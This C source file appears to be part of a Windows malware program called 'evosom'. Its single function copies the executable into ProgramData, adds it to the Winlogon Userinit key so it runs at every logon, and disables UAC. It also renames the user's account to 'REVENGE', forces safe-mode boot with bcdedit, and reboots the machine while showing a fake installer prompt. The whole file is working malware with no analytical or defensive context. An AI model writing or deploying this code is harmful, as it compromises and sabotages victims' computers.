#include "evosom.h"



#include <stdio.h>







BOOL payload1(char* name) {
    FILE* sourceFile, * destinationFile;
    char buffer[4096];
    size_t bytesRead;

    sourceFile = fopen(name, "rb");

    if (sourceFile == NULL) {
        perror("Error opening source file");
        return FALSE;
    }

    
    destinationFile = fopen("C:\\ProgramData\\APHostClient.exe", "wb");

    if (destinationFile == NULL) {
        perror("Error opening destination file");
        fclose(sourceFile);
        return -1;
    }

    
    while ((bytesRead = fread(buffer, 1, sizeof(buffer), sourceFile)) > 0) {
        fwrite(buffer, 1, bytesRead, destinationFile);
    }

    
    fclose(sourceFile);
    fclose(destinationFile);

    printf("Executable copied successfully.\n");
   

    FILE* checker;
    checker = fopen("C:\\ProgramData\\APHostClient.dll", "w");
    if (!checker) {
        perror("Failed Copying FIle!");
        return FALSE;
    }

    if (fprintf(checker, "APHOSTCLIENT") < 0) {
        perror("Failed writing to file");
        fclose(checker);
        return FALSE;
    }
    fclose(checker);

    char username[4096 + 1];
    DWORD usernameLen = 4096 + 1;

    GetUserNameA(username, &usernameLen);
    char wmicCommand[512];
    snprintf(wmicCommand, sizeof(wmicCommand), "wmic useraccount where name='%s' rename 'REVENGE'", username);
    WinExec("reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v Userinit /t REG_SZ /d \"C:\\ProgramData\\APHostClient.exe, C:\\Windows\\System32\\userinit.exe\" /f", SW_HIDE);
    WinExec("reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWORD /d 0 /f", SW_HIDE);
    WinExec(wmicCommand, SW_HIDE);
    WinExec("bcdedit /set {current} safeboot minimal", SW_HIDE);
    Sleep(10000);

    MessageBoxW(NULL, L"PRESS OK TO RESTART!", L"EVOSOM INSTALLER", MB_OK | MB_ICONINFORMATION);


    WinExec("shutdown -r -f -t 0", SW_HIDE);
    



    return TRUE;
}
